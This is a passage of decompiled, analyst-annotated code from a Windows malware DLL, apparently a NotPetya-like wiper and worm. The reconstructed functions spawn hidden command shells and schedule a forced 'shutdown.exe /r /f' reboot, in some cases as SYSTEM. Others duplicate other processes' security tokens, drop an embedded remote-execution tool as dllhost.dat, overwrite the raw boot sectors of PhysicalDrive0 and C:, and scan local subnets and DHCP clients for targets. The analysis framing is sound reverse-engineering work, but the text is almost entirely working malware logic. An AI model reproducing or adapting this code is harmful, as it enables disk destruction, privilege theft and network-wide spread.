  *(undefined2 *)(in_EAX + 0x7fe) = 0;
  DVar1 = GetEnvironmentVariableW(L"ComSpec",local_670,0x30c);
  if (DVar1 == 0) {
    UVar2 = GetSystemDirectoryW(local_670,0x30c);
    if (UVar2 == 0) {
      return 0;
    }
    pWVar3 = lstrcatW(local_670,L"\\cmd.exe");
    if (pWVar3 == (LPWSTR)0x0) {
      return 0;
    }
  }
  iVar7 = 0x10;
  p_Var4 = &local_14;
  do {
    *(undefined1 *)&p_Var4->hProcess = 0;
    p_Var4 = (_PROCESS_INFORMATION *)((int)&p_Var4->hProcess + 1);
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  iVar7 = 0x44;
  p_Var5 = &local_58;
  do {
    *(undefined1 *)&p_Var5->cb = 0;
    p_Var5 = (_STARTUPINFOW *)((int)&p_Var5->cb + 1);
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  local_58.cb = 0x44;
  BVar6 = CreateProcessW(local_670,local_e70,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0,&local_58,&local_14);
  if (BVar6 != 0) {
    Sleep(delay_seconds * 1000);
  }
  return BVar6;
}



/*
 * RECONSTRUCTED FUNCTION: DetectTaskSchedulerVariant_10008494
 * Ghidra symbol: FUN_10008494 | VA: 0x10008494 | original source line: 7653
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetVersionExW
 * Direct function references: none mapped
 */
undefined4 DetectTaskSchedulerVariant_10008494(void)

{
  BOOL BVar1;
  undefined4 uVar2;
  _OSVERSIONINFOW local_118;
  
  uVar2 = 0;
  memset(&local_118,0,0x114);
  local_118.dwOSVersionInfoSize = 0x114;
  BVar1 = GetVersionExW(&local_118);
  if ((BVar1 != 0) && (5 < local_118.dwMajorVersion)) {
    uVar2 = 1;
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ScheduleDelayedRestart_100084DF
 * Ghidra symbol: FUN_100084df | VA: 0x100084DF | original source line: 7672
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetLocalTime, GetSystemDirectoryW
 * Direct function references: ComputeElapsedTimeInterval_10006973, SpawnHiddenCommandInterpreter_100083BD, DetectTaskSchedulerVariant_10008494
 */
BOOL ScheduleDelayedRestart_100084DF(void)

{
  uint uVar1;
  UINT UVar2;
  BOOL BVar3;
  int iVar4;
  wchar_t *pwVar5;
  uint uVar6;
  BOOL BVar7;
  int iVar8;
  WCHAR local_e2c [1023];
  undefined2 local_62e;
  WCHAR local_62c [780];
  _SYSTEMTIME local_14;
  
  BVar7 = 0;
  GetLocalTime(&local_14);
  uVar1 = ComputeElapsedTimeInterval_10006973();
  if (uVar1 < 10) {
    uVar1 = 10;
  }
  uVar6 = ((uint)local_14.wHour + (uVar1 + 3) / 0x3c) % 0x18;
  iVar8 = (uint)local_14.wMinute + (uVar1 + 3) % 0x3c;
  UVar2 = GetSystemDirectoryW(local_62c,0x30c);
  if (UVar2 != 0) {
    BVar3 = PathAppendW(local_62c,L"shutdown.exe /r /f");
    if (BVar3 != 0) {
      iVar4 = DetectTaskSchedulerVariant_10008494();
      if (iVar4 == 0) {
        wsprintfW(local_e2c,L"at %02d:%02d %ws",uVar6,iVar8,local_62c);
      }
      else {
        pwVar5 = L"/RU \"SYSTEM\" ";
        if (((byte)g_privilege_and_execution_flags & 4) == 0) {
          pwVar5 = L"";
        }
        wsprintfW(local_e2c,L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d",
                  pwVar5,local_62c,uVar6,iVar8);
      }
      local_62e = 0;
      BVar7 = SpawnHiddenCommandInterpreter_100083BD(0);
    }
  }
  return BVar7;
}



/*
 * RECONSTRUCTED FUNCTION: DecompressWin32Resource_100085D0
 * Ghidra symbol: FUN_100085d0 | VA: 0x100085D0 | original source line: 7721
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: LoadResource, GetProcessHeap
 * Direct function references: InflateResourceBuffer_1000A520
 */
undefined4 DecompressWin32Resource_100085D0(SIZE_T *param_1,HRSRC param_2)

{
  HGLOBAL hResData;
  SIZE_T *pSVar1;
  DWORD DVar2;
  HANDLE pvVar3;
  LPVOID pvVar4;
  int iVar5;
  undefined4 *unaff_EBX;
  DWORD dwFlags;
  SIZE_T dwBytes;
  undefined4 local_8;
  
  local_8 = 0;
  hResData = LoadResource(DAT_1001f120,param_2);
  if (((hResData != (HGLOBAL)0x0) && (pSVar1 = LockResource(hResData), pSVar1 != (SIZE_T *)0x0)) &&
     (DVar2 = SizeofResource(DAT_1001f120,param_2), DVar2 != 0)) {
    dwBytes = *pSVar1;
    dwFlags = 8;
    pvVar3 = GetProcessHeap();
    pvVar4 = HeapAlloc(pvVar3,dwFlags,dwBytes);
    *unaff_EBX = pvVar4;
    if (pvVar4 != (LPVOID)0x0) {
      param_2 = (HRSRC)*pSVar1;
      iVar5 = InflateResourceBuffer_1000A520(pvVar4,&param_2,(int)(pSVar1 + 1),DVar2 - 4);
      if (iVar5 == 0) {
        if (param_1 != (SIZE_T *)0x0) {
          *param_1 = (SIZE_T)param_2;
        }
        local_8 = 1;
      }
      else {
        pvVar4 = (LPVOID)*unaff_EBX;
        DVar2 = 0;
        pvVar3 = GetProcessHeap();
        HeapFree(pvVar3,DVar2,pvVar4);
      }
    }
  }
  return local_8;
}



/*
 * RECONSTRUCTED FUNCTION: DeriveRuntimeMaskFromProcessList_10008677
 * Ghidra symbol: FUN_10008677 | VA: 0x10008677 | original source line: 7766
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CreateToolhelp32Snapshot
 * Direct function references: none mapped
 */
uint DeriveRuntimeMaskFromProcessList_10008677(void)

{
  short sVar1;
  int iVar2;
  byte *pbVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined4 local_23c [9];
  byte local_218 [520];
  HANDLE local_10;
  int local_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  local_10 = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (local_10 != (HANDLE)0xffffffff) {
    local_23c[0] = 0x22c;
    iVar2 = Process32FirstW(local_10,local_23c);
    while (iVar2 != 0) {
      pbVar3 = local_218;
      local_c = 0x12345678;
      uVar7 = 0;
      do {
        sVar1 = *(short *)pbVar3;
        pbVar3 = pbVar3 + 2;
      } while (sVar1 != 0);
      uVar4 = (int)pbVar3 - (int)(local_218 + 2) >> 1;
      do {
        uVar6 = 0;
        if (uVar4 != 0) {
          uVar8 = uVar7;
          do {
            uVar5 = uVar8 & 3;
            iVar2 = uVar6 * 2;
            uVar6 = uVar6 + 1;
            uVar8 = uVar8 + 1;
            local_218[uVar5 + 0x20c] = (local_218[iVar2] ^ local_218[uVar5 + 0x20c]) - 1;
          } while (uVar6 < uVar4);
        }
        uVar7 = uVar7 + 1;
      } while (uVar7 < 3);
      if (local_c == 0x2e214b44) {
        local_8 = local_8 & 0xfffffff7;
      }
      else if ((local_c == 0x6403527e) || (local_c == 0x651b3005)) {
        local_8 = local_8 & 0xfffffffb;
      }
      iVar2 = Process32NextW(local_10,local_23c);
    }
    CloseHandle(local_10);
  }
  return local_8;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: CollectAccessibleSecurityTokens_1000875A
 * Ghidra symbol: FUN_1000875a | VA: 0x1000875A | original source line: 7828
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateToolhelp32Snapshot, GetLastError, GetTokenInformation
 * Direct function references: DetectTaskSchedulerVariant_10008494
 */
uint CollectAccessibleSecurityTokens_1000875A(int param_1)

{
  int iVar1;
  BOOL BVar2;
  uint uVar3;
  uint unaff_EBX;
  uint uVar4;
  HANDLE pvStack_129c;
  uint local_1298;
  HANDLE pvStack_1294;
  int local_1290;
  HANDLE pvStack_128c;
  DWORD DStack_1288;
  HANDLE pvStack_1284;
  int local_1280;
  int iStack_127c;
  undefined1 auStack_1278 [4];
  undefined4 local_1274;
  int iStack_1270;
  undefined4 auStack_1240 [2];
  DWORD DStack_1238;
  int aiStack_1010 [3];
  undefined1 local_1004 [4088];
  undefined4 uStack_c;
  
  uStack_c = 0x1000876a;
  local_1290 = 0;
  local_1280 = 0;
  aiStack_1010[2] = 0;
  memset(local_1004,0,0xffc);
  local_1298 = 0;
  local_1274 = DetectTaskSchedulerVariant_10008494();
  pvStack_128c = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (pvStack_128c != (HANDLE)0xffffffff) {
    auStack_1240[0] = 0x22c;
    iVar1 = Process32FirstW(pvStack_128c,auStack_1240);
    if (iVar1 == 0) {
      GetLastError();
    }
    else {
      local_1280 = param_1 - (int)aiStack_1010;
      do {
        local_1290 = -1;
        pvStack_129c = (HANDLE)0x0;
        pvStack_1294 = (HANDLE)0x0;
        pvStack_1284 = OpenProcess(0x450,0,DStack_1238);
        if (pvStack_1284 != (HANDLE)0x0) {
          BVar2 = OpenProcessToken(pvStack_1284,0x2000000,&pvStack_129c);
          uVar4 = unaff_EBX;
          if ((((BVar2 != 0) &&
               (BVar2 = GetTokenInformation(pvStack_129c,TokenSessionId,&local_1290,4,&DStack_1288),
               BVar2 != 0)) && ((iStack_127c == 0 || (local_1290 != 0)))) &&
             (BVar2 = DuplicateTokenEx(pvStack_129c,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,
                                       SecurityImpersonation,TokenImpersonation,&pvStack_1294),
             BVar2 != 0)) {
            memset(auStack_1278,0,0x38);
            BVar2 = GetTokenInformation(pvStack_1294,TokenStatistics,auStack_1278,0x38,&DStack_1288)
            ;
            iVar1 = iStack_1270;
            if (BVar2 != 0) {
              uVar3 = 0;
              if (unaff_EBX != 0) {
                do {
                  if (aiStack_1010[uVar3] == iStack_1270) goto LAB_100088f7;
                  uVar3 = uVar3 + 1;
                } while (uVar3 < unaff_EBX);
              }
              BVar2 = SetTokenInformation(pvStack_1294,TokenSessionId,&local_1290,4);
              if (BVar2 != 0) {
                local_1298 = local_1298 + 1;
                uVar4 = unaff_EBX + 1;
                *(HANDLE *)((int)aiStack_1010 + local_1280 + unaff_EBX * 4) = pvStack_1294;
                aiStack_1010[unaff_EBX] = iVar1;
              }
            }
          }
LAB_100088f7:
          CloseHandle(pvStack_129c);
          CloseHandle(pvStack_1284);
          unaff_EBX = uVar4;
        }
      } while ((local_1298 < 0x40) &&
              (iVar1 = Process32NextW(pvStack_128c,auStack_1240), iVar1 != 0));
    }
    CloseHandle(pvStack_128c);
  }
  return local_1298;
}



/*
 * RECONSTRUCTED FUNCTION: WriteResourceToFile_10008946
 * Ghidra symbol: FUN_10008946 | VA: 0x10008946 | original source line: 7920
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW, WriteFile
 * Direct function references: none mapped
 */
undefined4 WriteResourceToFile_10008946(LPCWSTR param_1,LPCVOID param_2,DWORD param_3)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD unaff_EBX;
  undefined4 uVar2;
  
  uVar2 = 0;
  hFile = CreateFileW(param_1,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,(param_3 != 0) + 1,0,
                      (HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    BVar1 = WriteFile(hFile,param_2,unaff_EBX,&param_3,(LPOVERLAPPED)0x0);
    if ((BVar1 != 0) && (param_3 == unaff_EBX)) {
      uVar2 = 1;
    }
    CloseHandle(hFile);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ExtractDllhostResource_10008999
 * Ghidra symbol: FUN_10008999 | VA: 0x10008999 | original source line: 7943
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: FindResourceW, GetProcessHeap, GetWindowsDirectoryW, GetLastError
 * Direct function references: DecompressWin32Resource_100085D0, WriteResourceToFile_10008946
 */
undefined4 ExtractDllhostResource_10008999(int param_1)

{
  WCHAR WVar1;
  HRSRC pHVar2;
  int iVar3;
  HANDLE pvVar4;
  UINT UVar5;
  LPWSTR pWVar6;
  DWORD DVar7;
  SIZE_T SVar8;
  undefined1 *puVar9;
  undefined4 local_14;
  DWORD local_10;
  SIZE_T local_c;
  undefined1 *local_8;
  
  local_10 = 0;
  local_14 = 0;
  local_8 = (undefined1 *)0x0;
  local_c = 0;
  pHVar2 = FindResourceW(DAT_1001f120,(LPCWSTR)0x3,(LPCWSTR)0xa);
  if (pHVar2 == (HRSRC)0x0) {
    iVar3 = 0;
  }
  else {
    iVar3 = DecompressWin32Resource_100085D0(&local_c,pHVar2);
  }
  if (iVar3 == 0) goto LAB_10008abd;
  SVar8 = 0x208;
  DVar7 = 8;
  pvVar4 = GetProcessHeap();
  g_remote_execution_tool_path = HeapAlloc(pvVar4,DVar7,SVar8);
  if (param_1 == 0) {
    iVar3 = SHGetFolderPathW(0,0x23,0,0,g_remote_execution_tool_path);
    if (iVar3 == 0) {
      pWVar6 = g_remote_execution_tool_path;
      do {
        WVar1 = *pWVar6;
        pWVar6 = pWVar6 + 1;
      } while (WVar1 != L'\0');
      UVar5 = (int)pWVar6 - (int)(g_remote_execution_tool_path + 1) >> 1;
      goto LAB_10008a3b;
    }
LAB_10008a59:
    DVar7 = 0;
    pWVar6 = g_remote_execution_tool_path;
    pvVar4 = GetProcessHeap();
    HeapFree(pvVar4,DVar7,pWVar6);
    g_remote_execution_tool_path = (LPCWSTR)0x0;
  }
  else {
    UVar5 = GetWindowsDirectoryW(g_remote_execution_tool_path,0x104);
LAB_10008a3b:
    if ((UVar5 == 0) || (0x103 < UVar5 + 0xc)) goto LAB_10008a59;
    PathAppendW(g_remote_execution_tool_path,L"dllhost.dat");
  }
  SVar8 = local_c;
  puVar9 = local_8;
  if ((g_remote_execution_tool_path != (LPCWSTR)0x0) &&
     ((iVar3 = WriteResourceToFile_10008946(g_remote_execution_tool_path,local_8,0), iVar3 != 0 ||
      (local_10 = GetLastError(), SVar8 = local_c, puVar9 = local_8, local_10 == 0x50)))) {
    local_10 = 0;
    local_14 = 1;
    SVar8 = local_c;
    puVar9 = local_8;
  }
  for (; SVar8 != 0; SVar8 = SVar8 - 1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  DVar7 = 0;
  puVar9 = local_8;
  pvVar4 = GetProcessHeap();
  HeapFree(pvVar4,DVar7,puVar9);
LAB_10008abd:
  SetLastError(local_10);
  return local_14;
}



/*
 * RECONSTRUCTED FUNCTION: ReadSelfModuleIntoHeapBuffer_10008ACF
 * Ghidra symbol: FUN_10008acf | VA: 0x10008ACF | original source line: 8025
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW, GetFileSize, GetProcessHeap, ReadFile
 * Direct function references: none mapped
 */
undefined4 ReadSelfModuleIntoHeapBuffer_10008ACF(void)

{
  HANDLE hFile;
  DWORD DVar1;
  HANDLE pvVar2;
  LPVOID lpBuffer;
  BOOL BVar3;
  DWORD dwFlags;
  DWORD dwBytes;
  undefined4 local_10;
  DWORD local_8;
  
  local_10 = 0;
  hFile = CreateFileW(&g_original_dll_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    DVar1 = GetFileSize(hFile,(LPDWORD)0x0);
    if (DVar1 != 0) {
      dwFlags = 0;
      dwBytes = DVar1;
      pvVar2 = GetProcessHeap();
      lpBuffer = HeapAlloc(pvVar2,dwFlags,dwBytes);
      if (lpBuffer != (LPVOID)0x0) {
        local_8 = 0;
        BVar3 = ReadFile(hFile,lpBuffer,DVar1,&local_8,(LPOVERLAPPED)0x0);
        if ((BVar3 == 0) && (local_8 == DVar1)) {
          DVar1 = 0;
          pvVar2 = GetProcessHeap();
          HeapFree(pvVar2,DVar1,lpBuffer);
        }
        else {
          local_10 = 1;
          DAT_1001f0fc = lpBuffer;
          DAT_1001f11c = DVar1;
        }
      }
    }
    CloseHandle(hFile);
  }
  return local_10;
}



/*
 * RECONSTRUCTED FUNCTION: NormalizeRemoteTarget_10008B70
 * Ghidra symbol: FUN_10008b70 | VA: 0x10008B70 | original source line: 8069
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 NormalizeRemoteTarget_10008B70(int param_1)

{
  WCHAR WVar1;
  LPWSTR pWVar2;
  LPWSTR pWVar3;
  int iVar4;
  undefined4 uVar5;
  
  uVar5 = 0;
  if (param_1 != 0) {
    pWVar2 = PathFindFileNameW(&g_original_dll_path);
    if (pWVar2 != (LPWSTR)0x0) {
      pWVar3 = pWVar2;
      do {
        WVar1 = *pWVar3;
        pWVar3 = pWVar3 + 1;
      } while (WVar1 != L'\0');
      if ((uint)((int)pWVar3 - (int)(pWVar2 + 1) >> 1) < 0x104) {
        iVar4 = param_1 - (int)pWVar2;
        do {
          WVar1 = *pWVar2;
          *(WCHAR *)(iVar4 + (int)pWVar2) = WVar1;
          pWVar2 = pWVar2 + 1;
        } while (WVar1 != L'\0');
        uVar5 = 1;
      }
    }
  }
  return uVar5;
}



/*
 * RECONSTRUCTED FUNCTION: InspectTokenGroupMembership_10008BC6
 * Ghidra symbol: FUN_10008bc6 | VA: 0x10008BC6 | original source line: 8103
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetCurrentThread, GetLastError, GetTokenInformation, GetSidSubAuthorityCount, GetSidSubAuthority
 * Direct function references: none mapped
 */
int InspectTokenGroupMembership_10008BC6(void)

{
  HANDLE ThreadHandle;
  uint *TokenInformation;
  byte *pbVar1;
  PDWORD pDVar2;
  uint uVar3;
  uint *puVar4;
  DWORD DVar5;
  BOOL BVar6;
  HANDLE *TokenHandle;
  int local_10;
  HANDLE local_c;
  DWORD local_8;
  
  TokenHandle = &local_c;
  BVar6 = 1;
  DVar5 = 0x20008;
  local_10 = 0;
  local_c = (HANDLE)0x0;
  ThreadHandle = GetCurrentThread();
  BVar6 = OpenThreadToken(ThreadHandle,DVar5,BVar6,TokenHandle);
  if (BVar6 == 0) {
    GetLastError();
  }
  else {
    local_8 = 0;
    BVar6 = GetTokenInformation(local_c,TokenGroups,(LPVOID)0x0,0,&local_8);
    if ((BVar6 == 0) && (DVar5 = GetLastError(), DVar5 == 0x7a)) {
      TokenInformation = GlobalAlloc(0x40,local_8);
      if (TokenInformation == (uint *)0x0) {
        GetLastError();
      }
      else {
        BVar6 = GetTokenInformation(local_c,TokenGroups,TokenInformation,local_8,&local_8);
        if (BVar6 == 0) {
          GetLastError();
        }
        else {
          uVar3 = 0;
          if (*TokenInformation != 0) {
            puVar4 = TokenInformation + 1;
            do {
              if (local_10 != 0) break;
              pbVar1 = GetSidSubAuthorityCount((PSID)*puVar4);
              if ((((pbVar1 != (byte *)0x0) && (3 < *pbVar1)) &&
                  (pDVar2 = GetSidSubAuthority((PSID)*puVar4,4), pDVar2 != (PDWORD)0x0)) &&
                 ((*pDVar2 == 0x200 || (*pDVar2 == 0x207)))) {
                local_10 = 1;
              }
              uVar3 = uVar3 + 1;
              puVar4 = puVar4 + 2;
            } while (uVar3 < *TokenInformation);
          }
        }
        GlobalFree(TokenInformation);
      }
    }
    CloseHandle(local_c);
  }
  return local_10;
}



/*
 * RECONSTRUCTED FUNCTION: AlternatePhysicalDiskWritePath_10008CBF
 * Ghidra symbol: FUN_10008cbf | VA: 0x10008CBF | original source line: 8169
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileA, DeviceIoControl, WriteFile
 * Direct function references: none mapped
 */
undefined4 AlternatePhysicalDiskWritePath_10008CBF(void)

{
  HANDLE hDevice;
  undefined4 uVar1;
  undefined1 local_24 [20];
  int local_10;
  LPCVOID local_c;
  DWORD local_8;
  
  hDevice = CreateFileA("\\\\.\\PhysicalDrive0",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                        (HANDLE)0x0);
  if (hDevice == (HANDLE)0x0) {
    uVar1 = 0;
  }
  else {
    DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_24,0x18,&local_8,(LPOVERLAPPED)0x0);
    local_c = LocalAlloc(0,local_10 * 10);
    if (local_c != (HLOCAL)0x0) {
      DeviceIoControl(hDevice,0x90020,(LPVOID)0x0,0,(LPVOID)0x0,0,&local_8,(LPOVERLAPPED)0x0);
      WriteFile(hDevice,local_c,local_10 * 10,&local_8,(LPOVERLAPPED)0x0);
      LocalFree(local_c);
    }
    CloseHandle(hDevice);
    uVar1 = 1;
  }
  return uVar1;
}



/*
 * RECONSTRUCTED FUNCTION: DispatchDiskBootStage_10008D5A
 * Ghidra symbol: FUN_10008d5a | VA: 0x10008D5A | original source line: 8200
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileA, DeviceIoControl, WriteFile
 * Direct function references: PrepareDiskBootPayload_100014A9, AlternatePhysicalDiskWritePath_10008CBF
 * ANALYST OBSERVATION: Disk/boot stage dispatcher; distinct from the SMB1 exploitation subsystem.
 */
void DispatchDiskBootStage_10008D5A(void)

{
  HANDLE hDevice;
  BOOL BVar1;
  HLOCAL lpBuffer;
  int iVar2;
  DWORD local_24;
  undefined1 local_20 [20];
  DWORD local_c;
  
  hDevice = CreateFileA("\\\\.\\C:",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0x0) {
    BVar1 = DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_20,0x18,&local_24,(LPOVERLAPPED)0x0)
    ;
    if ((BVar1 != 0) && (lpBuffer = LocalAlloc(0,local_c * 10), lpBuffer != (HLOCAL)0x0)) {
      SetFilePointer(hDevice,local_c,(PLONG)0x0,0);
      WriteFile(hDevice,lpBuffer,local_c,&local_24,(LPOVERLAPPED)0x0);
      LocalFree(lpBuffer);
    }
    CloseHandle(hDevice);
  }
  if (((g_runtime_feature_flags & 8) == 0) || (iVar2 = PrepareDiskBootPayload_100014A9(), iVar2 != 0)) {
    AlternatePhysicalDiskWritePath_10008CBF();
    return;
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: SubnetWorker_10008E04
 * Ghidra symbol: FUN_10008e04 | VA: 0x10008E04 | original source line: 8231
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: Ordinal_14, Ordinal_12, GetProcessHeap
 * Direct function references: ConvertSmbAddressToWideString_10006916, QueueNetworkHostFromArgument_10006FC7, ClassifyRemoteServiceResponse_1000A3D9
 */
undefined4 SubnetWorker_10008E04(uint *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  LPCSTR pCVar4;
  LPWSTR lpMem;
  HANDLE hHeap;
  uint uVar5;
  DWORD dwFlags;
  
  uVar1 = param_1[1];
  for (uVar5 = *param_1; uVar5 < uVar1; uVar5 = uVar5 + 1) {
    uVar2 = Ordinal_14(uVar5);
    iVar3 = ClassifyRemoteServiceResponse_1000A3D9(uVar2);
    if (iVar3 != 0) {
      uVar2 = Ordinal_14(uVar5);
      pCVar4 = (LPCSTR)Ordinal_12(uVar2);
      lpMem = ConvertSmbAddressToWideString_10006916(pCVar4);
      if (lpMem != (LPWSTR)0x0) {
        QueueNetworkHostFromArgument_10006FC7((LPCRITICAL_SECTION)param_1[2]);
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,lpMem);
      }
    }
  }
  LocalFree(param_1);
  return 0;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

/*
 * RECONSTRUCTED FUNCTION: DiscoverNetworkInterfaceSubnets_10008E7F
 * Ghidra symbol: FUN_10008e7f | VA: 0x10008E7F | original source line: 8267
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetAdaptersInfo, Ordinal_11, GetProcessHeap, Ordinal_14, CreateThread
 * Direct function references: ConvertSmbAddressToWideString_10006916, QueueNetworkHostFromArgument_10006FC7, Unresolvedroutine_10008243, SubnetWorker_10008E04, EnumerateDhcpSubnetClients_1000908A
 */
undefined4 DiscoverNetworkInterfaceSubnets_10008E7F(LPCRITICAL_SECTION param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  LPWSTR pWVar4;
  HANDLE pvVar5;
  undefined4 *lpParameter;
  undefined4 uVar6;
  uint uVar7;
  undefined4 *puVar8;
  undefined4 *unaff_EDI;
  DWORD DVar9;
  int iVar10;
  undefined4 *puVar11;
  SIZE_T local_3018;
  int *piStack_3014;
  undefined4 local_3010 [3];
  undefined1 local_3004 [4072];
  uint auStack_201c [5];
  undefined4 local_2008;
  undefined1 local_2004 [8184];
  undefined4 uStack_c;
  
  uStack_c = 0x10008e8f;
  puVar8 = (undefined4 *)0x0;
  local_3010[2] = 0;
  memset(local_3004,0,0xffc);
  local_2008 = 0;
  memset(local_2004,0,0x1ffc);
  puVar11 = local_3010;
  iVar10 = 0;
  local_3010[0] = 0;
  local_3018 = 0;
  iVar1 = GetAdaptersInfo();
  if ((iVar1 == 0x6f) && (piVar2 = LocalAlloc(0x40,local_3018), piVar2 != (int *)0x0)) {
    piStack_3014 = piVar2;
    iVar1 = GetAdaptersInfo(piVar2,&local_3018);
    if (iVar1 == 0) {
      do {
        if ((undefined4 *)0x3ff < puVar11) break;
        uVar3 = Ordinal_11(piVar2 + 0x6c);
        auStack_201c[iVar10 * 2] = uVar3;
        uVar3 = Ordinal_11(piVar2 + 0x70);
        auStack_201c[(int)puVar11 * 2 + 2] = uVar3;
        pWVar4 = ConvertSmbAddressToWideString_10006916((LPCSTR)(piVar2 + 0x6c));
        if (pWVar4 != (LPWSTR)0x0) {
          QueueNetworkHostFromArgument_10006FC7(param_1);
          DVar9 = 0;
          pvVar5 = GetProcessHeap();
          HeapFree(pvVar5,DVar9,pWVar4);
        }
        if ((piVar2[0x69] != 0) &&
           (pWVar4 = ConvertSmbAddressToWideString_10006916((LPCSTR)(piVar2 + 0x80)), pWVar4 != (LPWSTR)0x0)) {
          QueueNetworkHostFromArgument_10006FC7(param_1);
          DVar9 = 0;
          pvVar5 = GetProcessHeap();
          HeapFree(pvVar5,DVar9,pWVar4);
        }
        piVar2 = (int *)*piVar2;
        puVar11 = (undefined4 *)((int)puVar11 + 1);
      } while (piVar2 != (int *)0x0);
      iVar1 = Unresolvedroutine_10008243();
      if (iVar1 != 0) {
        EnumerateDhcpSubnetClients_1000908A(param_1);
      }
      if (puVar11 != (undefined4 *)0x0) {
        do {
          lpParameter = LocalAlloc(0x40,0xc);
          if (lpParameter != (undefined4 *)0x0) {
            uVar3 = Ordinal_11("255.255.255.255");
            uVar7 = auStack_201c[(int)unaff_EDI * 2 + 1] & auStack_201c[(int)unaff_EDI * 2 + 2];
            if ((uVar7 != 0) && (uVar3 != auStack_201c[(int)unaff_EDI * 2 + 2] || uVar7 != 0)) {
              uVar6 = Ordinal_14(uVar7);
              *lpParameter = uVar6;
              uVar6 = Ordinal_14(unaff_EDI);
              lpParameter[1] = uVar6;
              lpParameter[2] = param_1;
              pvVar5 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,SubnetWorker_10008E04,lpParameter,0,
                                    (LPDWORD)0x0);
              if (pvVar5 != (HANDLE)0x0) {
                local_3010[(int)unaff_EDI - 2] = pvVar5;
              }
            }
          }
          unaff_EDI = (undefined4 *)((int)unaff_EDI + 1);
        } while (unaff_EDI < puVar11);
      }
      if (unaff_EDI != (undefined4 *)0x0) {
        do {
          CloseHandle((HANDLE)local_3010[(int)puVar8 - 2]);
          puVar8 = (undefined4 *)((int)puVar8 + 1);
        } while (puVar8 < unaff_EDI);
      }
    }
    LocalFree((HLOCAL)0x0);
  }
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: EnumerateDhcpSubnetClients_1000908A
 * Ghidra symbol: FUN_1000908a | VA: 0x1000908A | original source line: 8370
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetComputerNameExW, DhcpEnumSubnets, DhcpGetSubnetInfo, DhcpEnumSubnetClients, Ordinal_14, Ordinal_12, GetProcessHeap, DhcpRpcFreeMemory
 * Direct function references: ConvertSmbAddressToWideString_10006916, QueueNetworkHostFromArgument_10006FC7, ClassifyRemoteServiceResponse_1000A3D9
 */
undefined4 EnumerateDhcpSubnetClients_1000908A(LPCRITICAL_SECTION param_1)

{
  LPDHCP_CLIENT_INFO p_Var1;
  DWORD DVar2;
  undefined4 uVar3;
  int iVar4;
  LPCSTR pCVar5;
  LPWSTR lpMem;
  HANDLE hHeap;
  uint uVar6;
  uint uVar7;
  WCHAR local_248 [260];
  DWORD local_40;
  uint local_3c;
  DWORD local_38;
  uint local_34;
  DHCP_RESUME_HANDLE local_30 [2];
  DWORD local_28 [3];
  uint local_1c;
  uint local_18;
  LPDHCP_SUBNET_INFO local_14;
  LPDHCP_CLIENT_INFO_ARRAY local_10;
  LPDHCP_IP_ARRAY local_c [2];
  
  uVar6 = 0;
  uVar7 = 0;
  local_30[0] = 0;
  local_30[1] = 0;
  local_c[0] = (LPDHCP_IP_ARRAY)0x0;
  local_14 = (LPDHCP_SUBNET_INFO)0x0;
  local_10 = (LPDHCP_CLIENT_INFO_ARRAY)0x0;
  local_1c = 0;
  local_18 = 0;
  local_28[2] = 0;
  local_28[0] = 0;
  local_28[1] = 0;
  local_40 = 0;
  local_38 = 0x104;
  GetComputerNameExW(ComputerNamePhysicalNetBIOS,local_248,&local_38);
  DVar2 = DhcpEnumSubnets(local_248,local_30,0x400,local_c,local_28 + 2,local_28);
  if (DVar2 == 0) {
    local_3c = local_c[0]->NumElements;
    if (local_3c != 0) {
      do {
        DVar2 = DhcpGetSubnetInfo((WCHAR *)0x0,local_c[0]->Elements[uVar6],&local_14);
